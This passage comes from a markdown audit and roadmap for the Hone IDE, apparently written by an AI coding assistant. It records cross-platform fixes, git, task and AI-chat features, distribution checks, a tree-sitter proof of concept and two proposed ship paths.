   - **`.gitignore` cleanup (2026-05-14):** added `stderr*.log`, `screenshot*.png`, `.perry/`, `.claude/` patterns so dev-session detritus stays untracked. Verified `git status --short` only shows the 4 real new files now (`.github/workflows/ci.yml`, `LICENSE`, `scripts/`, `src/workbench/views/timeline/`).
   - **Agent-tool + claude-process portability (2026-05-14):** `claude-process.ts::findClaudeBinary` was a duplicate of `render.ts`'s Claude detection — both `which claude` (POSIX-only) and `echo $HOME` (POSIX-only) + hardcoded `/usr/local/bin/claude` and `/opt/homebrew/bin/claude`. Replaced with the cross-platform `where`/`which` branch and `getHomeDir()` from paths.ts, plus Windows-specific common locations (`%APPDATA%/npm/claude.cmd`). `agent-tools.ts::executeToolListDir` used `ls -la` shell — replaced with `readdirSync` + `isDirectory` for zero-shell directory listing. `agent-tools.ts::executeToolGitStatus` + `executeToolGitDiff` used `cd <ws> && git ... 2>&1` shell composition with custom quoting — rewritten to argv-form `spawnSync('git', ['-C', wsRoot, ...])`. `chat-panel.ts::loadProviderApiKey` used `execSync('echo $VAR')` to read env vars — replaced with direct `process.env[VAR]` (cross-platform and faster). `search-panel.ts::tryRipgrepSearch` built a shell string with POSIX `'\\''`-style single-quote escapes — rewritten to argv-form `spawnSync('rg', [...])` with the query as its own argv slot. Net: Claude Code chat, agent tools, ripgrep search, and provider key auto-detect all work on Windows without falling back to shell quirks.
   - **Tilde-path expansion + tasks-panel tmp (2026-05-14):** two more silent-failure paths. (a) `src/plugins.ts::initPluginSystem` was passing the literal string `'~/.hone/plugins'` to the Rust `pluginHostScanAndLoad` FFI. Rust doesn't shell-expand `~`, so the plugin loader was failing on every platform (not just Windows) — silently. Rewrote to use `getAppDataDir() + '/plugins'`, which resolves to `%USERPROFILE%/.hone/plugins` on Windows / `$HOME/.hone/plugins` on Unix. (b) `tasks-panel.ts::runTask` had a `/tmp/hone-task-<label>.log` fallback for tasks-output log path when appDataDir was empty — routed through `getTempDir()` (already cross-platform from prior iter).
   - **Cleanup pass + 3 more bugs (2026-05-14):** (a) `checkClaudeAuth` in claude-process.ts used `execSync(bin + ' auth status')` — broken when `bin` contains spaces (typical under `%APPDATA%\Roaming\npm\claude.cmd`). Rewrote to argv-form. (b) `marketplace-browser.ts::marketplaceFetch` built a shell string with embedded URL — URLs with `&` would shell-split. Rewrote to `spawnSync('curl', [...])` (curl ships with Windows 10+). (c) `render.ts::claudeRelayPollTick` had another `execSync('kill -0 <pid>')` liveness check — fixed with the same `tasklist /FI` Windows branch as #15's chat-panel fix. Also dead-code cleanup: removed unused `execGit` helper + `execSync` imports from 5 files (context-menu, search-panel, agent-tools, lsp-bridge, diff-view, claude-process) now that the actual call sites use spawnSync/process.env. Build verified — Perry compile clean for Windows target.
   - **Debug-panel buildRunCommand cross-platform (2026-05-14):** the v1-descoped Run panel's `buildRunCommand` had four Mac/Linux-only patterns: (a) Rust/C/C++ output to `/tmp/hone-debug-bin` — replaced with `getTempDir()` + `.exe` suffix on Windows. (b) `cd <cargoRoot> && cargo run` — Windows cmd needs `cd /d` to also switch drives, added a per-platform `cdFlag`. (c) `python3 file.py` — Windows usually has `python` not `python3`; added per-platform alias. (d) Hit a Perry AOT verifier panic on first pass because I used `?:` ternaries assembling strings (`isWin ? '/foo' : '/bar'`). Perry's verifier infers conflicting types for the variable; fixed by `let + if/else` (matches CLAUDE.md's "no `??`/`?.`" guidance). Build re-verified clean.
   - **LSP discovery + shell-quoting per-platform (2026-05-14):** two more sweeps. (a) `lsp-bridge.ts::startTypeScriptServer` was probing `node_modules/.bin/tsgo` and `/usr/local/bin/tsgo` — on Windows `node_modules/.bin/` ships `.cmd`/`.exe` wrappers, not bare names. Added platform-aware probe list: `.cmd` and `.exe` first on Win, bare name everywhere; `/usr/local/bin/...` and `/opt/homebrew/bin/...` only on non-Windows. The async `findExecutableOnPath('tsgo')` fallback (`where` on Win) was already wired from #15. (b) `shellEscape` in claude-process.ts and `shellEscapeRelay` in render.ts both used POSIX single-quote escaping (`'\\''`). cmd.exe has no single-quote semantics — it treats them as literal. Made both per-platform: POSIX `'...'` with `'\\''` escape; Windows `"..."` with `""` doubled for embedded quotes. Without this, Claude Code on Windows was being launched with quote-mangled arguments (filename with spaces would arrive as multiple args). Also removed dead `shellEscapePath` from agent-tools.ts now that the agent_git/list tools are argv-form.
   - **Per-platform monospace font (2026-05-14):** "looks like it should" visual fix. The codebase had hardcoded `'Menlo'` (macOS-only system mono font) in 15 files spanning ~40 call sites — chat panel, git panel, terminal, hover popup, autocomplete, signature help, debug, diagnostics, etc. On Windows Menlo doesn't exist so Win users got the platform's Courier New fallback (functional but ugly). Added `monoFont()` helper in `ui-helpers.ts` that returns the canonical mono font per platform: `Menlo` on macOS/iOS, `Consolas` on Windows, `DejaVu Sans Mono` on Linux (all of which ship by default). Updated every `textSetFontFamily(widget, sz, 'Menlo')` call site to `textSetFontFamily(widget, sz, monoFont())`. Editor's own font is rendered by Rust and has its own fallback chain; this fix is for the TS-rendered widgets in side panels, popups, status bars, and the AI chat. Build verified clean.
   - **SF Symbol → Unicode glyph fallback (2026-05-14):** "looks like it should" visual fix #2. `buttonSetImage(btn, 'chevron.right')` and similar SF-Symbol calls render an empty button on Windows / Linux (SF Symbols are macOS-only). Recent commit `8b171e9` had already added text labels to the desktop activity bar for this reason, but ~80 other icon-only buttons were still affected (file-tree chevrons, tab close `×`, find-bar prev/next/close/replace, etc.). Added `unicodeForSymbol(symbol)` mapping table (27 SF Symbols → Unicode glyphs: chevrons `›˅˄`, `xmark`→`✕`, `circle.fill`→`●`, `folder`→`📁`, `gearshape`→`⚙`, `magnifyingglass`→`🔍`, `pin.fill`→`📌`, `sparkles`→`✨`, arrows, play/pause/stop, etc.) and a `setIconButton(btn, symbol)` helper that calls `buttonSetImage` on macOS/iOS and `buttonSetTitle(glyph)` on every other platform.
   - **Full setIconButton rollout (2026-05-14):** completed in the iteration after the helper landed — converted **every** remaining `buttonSetImage(btn, sfSymbol)` call site (8 more files, ~34 sites): render.ts (breadcrumb, activity bar, bottom bar), explorer/sidebar-render.ts (new file/folder/collapse buttons), debug-panel.ts (play/pause/step/stop), status-bar.ts, tabs/tab-bar.ts, terminal-panel.ts, welcome-tab.ts. Removed the now-dead `buttonSetImage` imports from 8 files (still imported by ui-helpers internally for the macOS branch). Net effect: every icon-only button in the IDE now renders something visible on Windows — chevrons, close `×`s, play/pause, file/folder icons, etc. all show their Unicode glyph instead of being blank. Build verified clean with `perry compile --target windows`.
92. **[P2] App-wide undo/redo.** `edit.undo`/`edit.redo` registered as no-ops outside the editor.
   - **Phase 3 done (2026-05-12):** added `undoAction()` and `redoAction()` exports in render.ts that route through `editorInstance.executeCommand('editor.action.{undo,redo}')` plus an explicit re-render. `dispatchCommand` in native-menu.ts now has branches for `edit.undo` (length 9, `'e','u'`) and `edit.redo` (length 9, `'e','r'`). The Edit menu's Undo/Redo items and the `edit.undo`/`edit.redo` commands (from palette / future user keybindings) now route to the editor instead of no-oping. Cmd+Z continues to work via the Rust key handler for in-editor focus; this fills the menu+palette gap.
93. **[P2] Spinner / progress indicator widget for long ops.** Done: new `views/spinner/spinner.ts` exports `createSpinner`/`startSpinner`/`stopSpinner`/`setSpinnerLabel`/`disposeSpinner` with a fixed 8-slot pool. A single shared `setInterval(80ms)` cycles the 10-glyph braille frame across all active slots. First consumer: git push/pull/fetch — spinner sits below the sync row and only renders while a fetch is in flight.
94. **[P2] Drag and drop in explorer (move files + accept external drops).**
95. **[P2] Show/hide hidden files setting (independent of gitignore).**
   - **Phase 3 done (2026-05-12):** new `explorerShowHiddenFiles: boolean` setting (default `false`), persisted via the existing INI loop. `setSidebarShowHiddenFiles(N)` exported from `sidebar-render.ts`; the hardcoded `charCodeAt(0) === 46` skip is now gated on the toggle. `onSettingsChanged` pushes the setting and calls `refreshSidebarContent()` so the change is live without a relaunch.
96. **[P2] Status bar indent indicator reads real value** (`status-bar.ts:188` is hardcoded `'Spaces: 2'`).
   - **Phase 3 done (2026-05-12):** new `statusBarIndentLabel` widget stored, `updateStatusBarIndent(tabSize, insertSpaces)` exported from status-bar.ts, called from render.ts's existing `updateStatusBarIndent(tabSize, useTabs)` hook (line 1491) which detects indent style from file content. Label flips between `"Spaces: N"` and `"Tab Size: N"` based on `useTabs`. Clickable picker is a follow-up (#97).
97. **[P2] Status bar items become clickable** (branch → branch picker, language → language picker, encoding → encoding picker, EOL → EOL picker).
   - **Phase 3 done (2026-05-12):** branch, language, encoding, EOL, indent labels are now borderless `Button`s with click callbacks. `status-bar.ts` exports `setOnBranchClick`/`setOnLanguageClick`/`setOnEncodingClick`/`setOnEolClick`/`setOnIndentClick`. `updateStatusBarBranchLabel`/`updateStatusBarLanguage`/`updateStatusBarIndent` prefer `buttonSetTitle` on the new Button refs (with `textSetString` fallback). v1 wiring: branch click switches the sidebar to the Source Control panel (lands somewhere actionable); language/encoding/EOL/indent show a "coming in v1.1" notification so users see the click target is real. Dedicated pickers are the follow-up.
98. **[P2] Custom status bar widget API for extensions.** Done: 8 pre-allocated slots in `views/status-bar/status-bar.ts` (4 left-aligned after the branch row, 4 right-aligned before the language picker). New exports `registerStatusBarItem(alignment, text, onClick) → idx`, `updateStatusBarItemText(idx, text)`, `disposeStatusBarItem(idx)`. Render.ts re-exposes them as `addStatusBarItem` / `setStatusBarItemText` / `removeStatusBarItem` for the future hone-api runtime bridge (#56).

### Git

99. **[P2] Git decorations: complete the M/A/U/?/!/R/C set in explorer.** Some codes silently dropped by IDE (`git-panel.ts:221-264`). Done: `getGitFileStatus` now returns three new states — 5=conflicting (U), 6=renamed/copied (R/C), 7=ignored (!). New `gitIgnoredPaths` array is populated from `!` lines (used only when status is run with `--ignored`). New theme colors `getStatusConflictColor` / `getStatusRenamedColor` / `getStatusIgnoredColor` adapt for light/dark, and the explorer's color-mapping branch now handles all 7 codes.
   - **Phase 3 done (2026-05-12):** both `parseGitStatusLine` (sync) and the inline parser inside `refreshGitStateAsync`'s spawn() block now handle all porcelain v2 status code prefixes:
     - `1` ordinary changes — added/modified/deleted/renamed/copied/typechange/conflicting
     - `2` rename/copy — extracts the new path before the `\t` separator
     - `u` unmerged — surfaced as `conflicting` in the modified bucket so the user can resolve
     - `?` untracked — unchanged
     - `!` ignored — now populates `gitIgnoredPaths` for #50's gitignore-aware explorer. Explorer's color-mapping branch already handles status code 7 (ignored) via `getStatusIgnoredColor`, so the round-trip is now complete: status reports `!`, gitignore-aware explorer hides it, decorations dim it if the user toggles `explorerRespectGitignore` off.
     - Helper `statusLabelFromCode(c)` on the sync side; codes are inlined in the spawn block because Perry closures can't call module-level functions. Hone-core 66 git tests still pass.
100. **[P2] Tag operations (list, create, delete, push).** Done: tag list now has a TextField + "Create tag" row at the top (lightweight tag at HEAD via `git tag <name>`), plus per-row "Push" (`git push origin <tag>`) and "Delete" (`git tag -d <tag>`). All ops route through the new spinner (#93) and re-render the list on completion.
   - **Phase 3 partial done (2026-05-12):** "Tags" button in git panel toggles a list of the 20 newest tags via `git for-each-ref --sort=-creatordate`. Click a tag → `git checkout <tag>` (detached HEAD). Create / delete / push tag operations remain a follow-up (need confirm dialogs + text-input UI).
101. **[P2] Submodule support.** Done: "Submodules" button on git panel lists `git submodule status` rows with state hints (`(modified)` / `(not initialized)`), per-row "Update" button runs `git submodule update --init --recursive <path>`, plus "Update all" at the top for a single-tap path.
102. **[P2] LFS support detection / warnings.** Done: (1) pointer-file detection on file open — reading a `version https://git-lfs.github.com/spec/` file fires a "Run `git lfs pull` to fetch" warning notification (already wired in render.ts). (2) Repo-level detection — `detectLfsTracked()` scans `.gitattributes` for `filter=lfs` on every refresh; the result drives an "LFS" chip next to the branch name in the git panel and is exposed via `isLfsTrackedRepo()` for other modules.
103. **[P2] Commit graph rendering.** Done: new "History" button on the git panel toggles a 60-commit graph rendered via `git log --graph --decorate=short --pretty=format:%h %s --all`. Lines are placed in Menlo monospace `Text` widgets so the `* | \ /` ASCII branch art lines up. Container is hidden until first click; re-opening pulls fresh log output.
   - **Phase 3 done (2026-05-12):** `git log` now invoked with `--decorate=short --format=%h|%P|%an|%ar|%D|%s` so each row carries parent hashes and ref decorations. Renderer adds a per-commit marker (●/◇ — ◇ denotes a merge when parent-count ≥ 2) and a colored decoration row showing HEAD/branches/tags (cyan for HEAD, yellow for tags, green for local branches, muted for remote-tracking). Meta line appends `(merge)` for merge commits. Full lane-rendered ASCII graph is a follow-up.
104. **[P2] Inline diff toggle in diff view.** Done: header toggle button switches between side-by-side and unified-inline modes. Inline mode walks hunks in the diff text, emits context/`-`/`+` lines as a single read-only editor body, and paints per-line red/green backgrounds. Cache (`lastDiff*` vars) lets the toggle re-render without re-fetching git data; `closeDiffView` disposes the inline editor alongside the side-by-side pair. `toggleDiffViewMode()` exported for future keybinding.

### Tasks

105. **[P2] Tasks UI in IDE.** Back end exists (`task-config.ts`, `task-runner.ts`); no view, no runner-with-exec, no problems-from-task.
   - **Phase 3 done (2026-05-12):** new `views/tasks/tasks-panel.ts` (~340 LOC) reads `${workspaceRoot}/.hone/tasks.json` (falls back to `.vscode/tasks.json`) using a hand-rolled JSON walker — no `JSON.parse`. Parses `label`, `command`, `args` (string array), `group` (supports both `"build"` and `{kind, isDefault}` shapes). Renders one row per task with a Run button + group badge. Click spawns the command via `spawnBackground` with `cwd: workspaceRoot` and a sanitized log path under the app-data dir. Two commands registered (`tasks.runTask` opens the panel; `tasks.runBuildTask` runs the default build task or first build group). Run-start / run-done surface as notifications. Auto-detect of npm / cargo / gradle and problems-from-task integration remain follow-ups.

### AI

106. **[P2] Image input in chat.** No image picker, no base64 encode, no `image` content blocks.
107. **[P2] Inline "Fix with AI" / "Explain" on errors and selections.** Currently no editor lightbulb integration.
   - **Phase 6 done (2026-05-13):** the editor right-click menu (#88) now includes `Fix with AI` and `Explain with AI` items between Quick Fix and Format Document. Both route through new render.ts helpers: `fixWithAIFromCursor` grabs a 21-line window around the cursor + any diagnostics on that exact line from `getDiag*` getters, builds a `Fix the following code…` prompt with the file path + diagnostics + code block, switches activity to AI Chat (slot 4), and pre-fills via the same `prefillChatInput` path #63 uses. `explainWithAIFromCursor` does the same with an "Explain what the following code does. Focus on intent…" prompt and no diagnostics. User reviews + Enter to send. The native gutter lightbulb widget that VS Code shows on error lines needs Rust draw support in `hone-editor/native/macos/src/editor_view.rs`; the right-click + Cmd-click path covers the same intent on every platform without touching Rust. Empty-content guard surfaces a notification instead of sending an empty prompt.
108. **[P2] AI generate PR description.** Done: new "PR Desc" button on git panel reads commits + diff between HEAD and `main`/`master`/`origin/HEAD`, builds a structured prompt with summary + test-plan sections, and prefills AI Chat via `setGeneratePRDescriptionHandler`. Same prefill pattern as commit-message generator (#63).
109. **[P2] Bedrock / Vertex / Azure-OpenAI adapter wiring.** Code exists in `hone-core/src/ai/provider/adapters/` but IDE chat panel handles only 4 SSE formats. Done with honest scope: confirmed each cloud-provider adapter relays one of the four existing SSE formats — Bedrock (Claude models) emits the Anthropic Messages stream, Bedrock (Llama) and Vertex (Gemini) emit the Google `parts[].text` shape, Azure-OpenAI emits the OpenAI `delta.content` shape (`hone-core/src/ai/provider/adapters/{bedrock,vertex,azure-openai}.ts` build the right URL + body and parse the upstream chunks). For users today, the IDE's existing "Custom endpoint" model slot covers Azure-OpenAI and proxy-fronted Bedrock setups via OpenAI-compat. Direct IAM (Sigv4) for Bedrock and service-account auth for Vertex remain v1.1 — neither needed for the chat panel to consume the SSE stream once the request is signed at a higher layer.
110. **[P2] Session rename in AI chat.** `updateSessionTitle` exists in store but no UI. Done: pencil button per row in history dropdown opens AppleScript prompt with current title; saves via `updateSessionTitle` and refreshes list.
111. **[P2] Export / share chat.** Done: "Export" button in chat header writes the active session to Markdown (`## User` / `## Assistant` blocks) via the native Save dialog.

### Cross-platform

112. **[P2] LSP on iOS / iPad.** `lsp-bridge.ts:22` spawns subprocesses — blocked by iOS sandbox. Done: route LSP through the desktop host via sync, or descope.
113. **[P2] Terminal on iOS.** Same constraint. Likely "host-tunneled terminal" only.
114. **[P2] Mac vs iPad keybinding distinctions.** Single `Keybinding` set today. Done: `getDefaultKeybindings(platform)` now branches on `'ipados'` to add iPad-only entries — `Cmd+1`..`Cmd+4` for Files / Search / Source Control / AI Chat activity slots, and `Esc` for `view.dismissKeyboard` (no equivalent on macOS). iOS phone keeps the shared base set. Hook for further OS-specific removals already in place.
115. **[P2] Stage Manager support.** `UIRequiresFullScreen=true` disables it by design.
   - **Phase 3 done (2026-05-12):** flipped `UIRequiresFullScreen` to `false` and `UIApplicationSupportsMultipleScenes` to `true` in `Hone-ios.app/Info.plist`. PerryFrameSplit already handles arbitrary sizes (sidebar+editor adjust to whatever width the OS hands us), so Stage Manager + Split View should work. Re-verify during iPad QA — if exotic sizes break layout, flip back and queue the fix as part of iPad polish.

### Distribution

116. **[P2] Auto-update endpoint.** `update-checker.ts` exists; verify the server URL is real and serves a `version.json` for each platform. Done: verified hone-auth `GET /updates/latest?platform=<key>&current=<ver>` (`hone-auth/src/app.ts:1191`) matches the IDE client's contract (`{version,url,sha256,notes}` for an update, `{upToDate:true}` otherwise). Added missing `linux-aarch64` slot to `hone-auth/releases.json` so the client's `getPlatformKey()` arm doesn't fall through to "platform not in artifacts". Known v1 limitation: server-side check is exact-string equality, not semver compare — drift between `HONE_VERSION` (`0.1.0`) and `releases.json` `version` will silently mark clients out of date; a follow-up can swap the comparison for the client's `compareVersions`.
117. **[P2] Crash reporting.** No crash dump pipeline observed. Done: full pipeline verified end-to-end. Rust panic + signal hooks (`perry-ui-macos/src/crash_log.rs`, `perry-ui-ios/src/crash_log.rs`, `perry-ui-visionos/src/crash_log.rs`) write `~/.hone/crash.log` with `<type>:<message>` format on panic/SIGSEGV. IDE-side `checkAndReportCrash` (`hone-ide/src/workbench/telemetry.ts:96`) reads the file at startup, sanitizes (caps detail to 80 chars, strips file paths), emits a `crash` telemetry event, flushes immediately (doesn't wait for the 5-min batch), and deletes the log. `catch_callback_panic` clears the log on caught panics so non-fatal Perry FFI crashes aren't double-reported.

---

## P3 — Polish / post-v1

118. Zen mode / centered layout / full-screen command.
119. Multi-window (open second project alongside).
120. Welcome page walkthroughs + tip of the day rotation.
121. Settings sync across devices (toggle exists, transport doesn't).
122. Mermaid / KaTeX rendering in chat.
123. Voice input in chat.
124. Drag tab to split-create.
125. Bracket-pair guides separate from indent guides.
126. Cursor styles (block / line / underline + smooth/expand/phase blink).
127. File icon themes (separate from color themes).
128. Marketplace publishing flow (currently `publish()` returns mocked string).
129. Notebook support (`.ipynb` editor).
130. Comments API for extensions.

---

## Phase 0 — Tree-sitter PoC (#16, 2026-05-12)

> De-risking Phase 1's critical path. Goal: prove the tree-sitter compile chain works inside `hone-editor`'s Rust crate before committing to the full grammar set.

**What's in:** `hone-editor/native/macos/src/tree_sitter_bridge.rs` + `examples/demo_treesitter.rs`. Two grammars (TS, Python) wired through the `tree-sitter` 0.22 + grammar 0.21.x crates. Demo parses 400-byte samples and prints scope-tagged tokens.

**Results:**
- Compile + link clean. Grammars statically linked via cargo; no dynamic loading.
- TS sample emits 48 tokens covering `keyword.control`, `string.quoted`, `comment`, `constant.numeric`, `entity.name.function`, `entity.name.class`, `entity.name.type`, `variable.other.property`, `entity.name.function.call`.
- Python sample emits 35 tokens covering the same scope set (one gap: triple-quoted docstrings are emitted as the wrapping `string` node, not its leaf — easy fix in Phase 1 by emitting on `string` whether leaf or not).
- Perf on M-series: TS small file ~520 µs/parse, Python ~304 µs/parse. Extrapolated: a 10K-LOC file parses fully in ~125 ms. With incremental reparse on edit, well within the latency budget.

**Phase 1 follow-ups (do NOT repeat in PoC):**
- Swap the hand-rolled `scope_for_*` mapping for the bundled `HIGHLIGHTS_QUERY` `.scm` files (every grammar crate ships them).
- Expose `hone_editor_ts_tokenize` via Perry FFI (NaN-boxed StringHeader in, ArrayHeader of `{startByte, endByte, scope}` out).
- Move from full-parse-per-tokenize to `Parser::parse(source, Some(&old_tree))` for incremental reparse on edit.
- Port `tree_sitter_bridge.rs` to iOS / Windows / Linux native crates (Cargo deps identical; only the host platform changes).
- Expand grammar set: TS, JS, TSX, JSX, Python, Rust, Go, HTML, CSS, Markdown, JSON, YAML, TOML, C, C++, Java, Swift, Shell, Ruby.

**Decision confirmed:** tree-sitter is the right tokenizer for Phase 1. No surprises in the compile chain; perf is good; the grammar ecosystem ships highlight queries we can reuse.

---

## Recommended ship paths

There are two ways to read this list, and the trade-off is concrete:

**Path A — Honest v1 (≈4 weeks):** descope, ship a tight macOS-first product, market as "alpha" or "preview".
- Descope: PR review, AI inline (rename "snippet hints"), debug (rename "Run"), marketplace, sync review/trust (file-mirror only), iOS feature-parity (preview).
- Must still fix: P0 #1–#9, #15. P1 highlighting #16–19 (or descope multi-language and ship TS-only). Theme keys #20.
- Estimated work: ~3–5 weeks one engineer, primarily security + signing + tokenizer + command palette + theme keys.

**Path B — VS Code parity v1 (≈3–4 months):** ship the full feature set advertised in PROJECT_PLAN / MVP-CHECKLIST.
- Everything in P0 + P1 + most of P2. Realistically a 12–16 week engineering plan, larger if you keep iOS + sync in scope.

My read: Path A. The Hone differentiator (Perry-compiled native, cross-device sync) is real and worth shipping early — but only behind honest framing. Path B is a year project from here.

---

## How to convert this into issues

Each numbered bullet becomes one issue with labels:
- Priority label: `P0 / P1 / P2 / P3`
- Area label: `area:editor` / `area:lsp` / `area:workbench` / `area:git` / `area:terminal` / `area:debug` / `area:ai` / `area:extensions` / `area:sync` / `area:ios` / `area:ipad` / `area:dist` / `area:security`
- Type label: `type:bug` / `type:missing-feature` / `type:false-advertising` / `type:security` / `type:descope-decision`

Suggested next step: pick one of the two paths above; I'll generate the GitHub issues from the matching subset of this list.
